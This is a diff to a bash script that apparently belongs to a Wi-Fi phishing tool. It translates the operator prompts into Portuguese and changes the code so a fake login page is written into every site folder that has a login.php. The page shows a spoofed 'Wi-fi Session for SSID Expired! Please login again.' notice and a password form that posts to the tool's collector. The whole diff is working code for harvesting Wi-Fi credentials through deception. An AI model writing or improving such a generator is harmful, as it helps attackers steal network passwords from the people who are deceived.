@@ -39,34 +39,37 @@ createpage() {
   default_pass_text="Password"
   default_sub_text="Log-In"
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session for SSID Expired!): \e[0m' cap1
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Título 1 (Padrão: Wi-fi Session for SSID Expired!): \e[0m' cap1
   cap1="${cap1:-${default_cap1}}"
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Título 2 (Padrão: Please login again.): \e[0m' cap2
   cap2="${cap2:-${default_cap2}}"
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de Senha (Padrão: Password:): \e[0m' pass_text
   pass_text="${pass_text:-${default_pass_text}}"
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de Envio (Padrão: Log-In): \e[0m' sub_text
   sub_text="${sub_text:-${default_sub_text}}"
 
-  echo "<!DOCTYPE html>" > index.html
-  echo "<html>" >> index.html
-  echo "<body bgcolor=\"gray\" text=\"white\">" >> index.html
-  IFS=$'\n'
-  printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> index.html
-  IFS=$'\n'
-  printf '<form method="POST" action="%s"><label>%s </label>\n' $login_page $user_text >> index.html
-  IFS=$'\n'
-  printf '<br><label>%s: </label>' $pass_text >> index.html
-  IFS=$'\n'
-  printf '<input type="password" name="password" length=64><br><br>\n' >> index.html
-  IFS=$'\n'
-  printf '<input value="%s" type="submit"></form>\n' $sub_text >> index.html
-  printf '</center>' >> index.html
-  printf '<body>\n' >> index.html
-  printf '</html>\n' >> index.html
+  for login_page in $(find sites -type f -name 'login.php' -print); do
+    folder=$(dirname "$login_page")
+    echo "<!DOCTYPE html>" > "$folder/index.html"
+    echo "<html>" >> "$folder/index.html"
+    echo "<body bgcolor=\"gray\" text=\"white\">" >> "$folder/index.html"
+    IFS=$'\n'
+    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$cap1" "$cap2" >> "$folder/index.html"
+    IFS=$'\n'
+    printf '<form method="POST" action="%s"><label>%s </label>\n' "$login_page" "$user_text" >> "$folder/index.html"
+    IFS=$'\n'
+    printf '<br><label>%s: </label>' "$pass_text" >> "$folder/index.html"
+    IFS=$'\n'
+    printf '<input type="password" name="password" length=64><br><br>\n' >> "$folder/index.html"
+    IFS=$'\n'
+    printf '<input value="%s" type="submit"></form>\n' "$sub_text" >> "$folder/index.html"
+    printf '</center>' >> "$folder/index.html"
+    printf '<body>\n' >> "$folder/index.html"
+    printf '</html>\n' >> "$folder/index.html"
+  done
 }
 
 server() {
